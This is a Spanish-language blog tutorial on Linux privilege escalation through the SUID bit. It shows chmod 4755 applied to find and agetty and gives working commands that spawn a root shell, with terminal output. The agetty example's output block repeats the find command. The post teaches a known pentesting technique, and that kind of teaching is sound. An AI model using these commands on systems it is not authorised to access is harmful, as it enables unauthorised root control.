---
layout: single
title: Escalando Privilegios - Iniciando 1.1.1
excerpt: "Escalar privilegios - consiste en abrirse camino a través de vulnerabilidades del sistema para tener acceso a *comandos* que nos permitan manipular la máquina sin restricción alguna. Hablamos de *escalar* porque se inicia desde un nivel inferior de comandos muy limitados. En esta oportunidad presentaremos un caso en el que se aprovecha la vulnerabilidad *bit SUID* el cual es un permiso que cuando se le otorga a un *fichero* permite que quien lo ejecute pueda tener los mismos permisos del creador."
date: 2022-03-13
classes: wide
header:
  teaser: /assets/images/htb-write-Esprivilegios/Escprivilegios.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - vulnerabilidad
  - infosec
tags:  
  - privilegios
  - basic
  - escalar
  - suid
  - vulnerabilidad
---

![](/assets/images/htb-write-Esprivilegios/Escprivilegios.png)

Escalar privilegios - consiste en abrirse camino a través de vulnerabilidades del sistema para tener acceso a *comandos* que nos permitan manipular la máquina sin restricción alguna. Hablamos de *escalar* porque se inicia desde un nivel inferior de comandos   muy limitados. En esta oportunidad presentaremos un caso en el que se aprovecha la vulnerabilidad *bit SUID (Set ID de Usuario en Ejecución)* el cual es un permiso que cuando se le otorga a un *fichero* permite que quien lo ejecute pueda tener los mismos permisos del creador del archivo. 


Conocimientos necesarios

-Permisos, derechos y atributos en Linux
-Permisos especiales : SUID


Si el creador del fichero es el usuario `root` podremos acceder a sus privilegios si este por ejemplo le asigna al comando `find` (es una herramienta de busqueda) el permiso SUID 

`❯ chmod 4755 /usr/bin/find`

Observaremos que la `X` (execute) de los permisos del `propietario` es remplazada por una `s` (SetUID)

```
❯ which find | xargs ls -l
-rwxr-xr-x 1 root root 311008 ene  9  2021 /usr/bin/find
❯ chmod 4755 /usr/bin/find
❯ which find | xargs ls -l
-rwsr-xr-x 1 root root 311008 ene  9  2021 /usr/bin/find
```

Un usuario puede salir de su entorno restringido al generar un shell de sistema interactivo con la siguiente instrucción `find . -exec /bin/sh \; -quit` y tener todos los privilegios del usuario que creo el archivo (en este caso root).

```
┌─[pepito@Tahy]─[/home/tahy]
└──╼ $whoami
pepito
┌─[pepito@Tahy]─[/home/tahy]
└──╼ $find . -exec /bin/sh -p \; -quit
# whoami
root
# 
 ```

Este procedimiento se puedo aplicar para cualquier fichero, en este caso probamos la instrucción  `agetty`

```
-rwxr-xr-x 1 root root 64936 ene 20 17:10 /usr/sbin/agetty
❯ chmod 4755 /usr/sbin/agetty
❯ which agetty | xargs ls -l
-rwsr-xr-x 1 root root 64936 ene 20 17:10 /usr/sbin/agetty
```

Desde el mismo usuario "pepito" con privilegios limitados podremos acceder al usuario root sin escribir CONTRASEÑA alguna, ejecutando la siguiente linea `agetty -o -p -l /bin/sh -a root tty`

```  
┌─[pepito@Tahy]─[/home/tahy]
└──╼ $whoami
pepito
┌─[pepito@Tahy]─[/home/tahy]
└──╼ $find . -exec /bin/sh -p \; -quit
# whoami  
root
# 
```  

Siendo esta una de las vulnerabilidades más basica y primarias del pentestting.

fuentes

- [https://www.mastermind.ac/courses/introduccion-al-hacking-etico](https://www.mastermind.ac/courses/introduccion-al-hacking-etico)
- [https://www.ibiblio.org/pub/Linux/docs/LuCaS/Manuales-LuCAS/doc-curso-salamanca-admin-avanzada/html/ch08s06.html](https://www.ibiblio.org/pub/Linux/docs/LuCaS/Manuales-LuCAS/doc-curso-salamanca-admin-avanzada/html/ch08s06.html
)
- [https://www.ochobitshacenunbyte.com/2019/06/17/permisos-especiales-en-linux-sticky-bit-suid-y-sgid/](https://www.ochobitshacenunbyte.com/2019/06/17/permisos-especiales-en-linux-sticky-bit-suid-y-sgid/)

- [https://gtfobins.github.io/](https://gtfobins.github.io/)

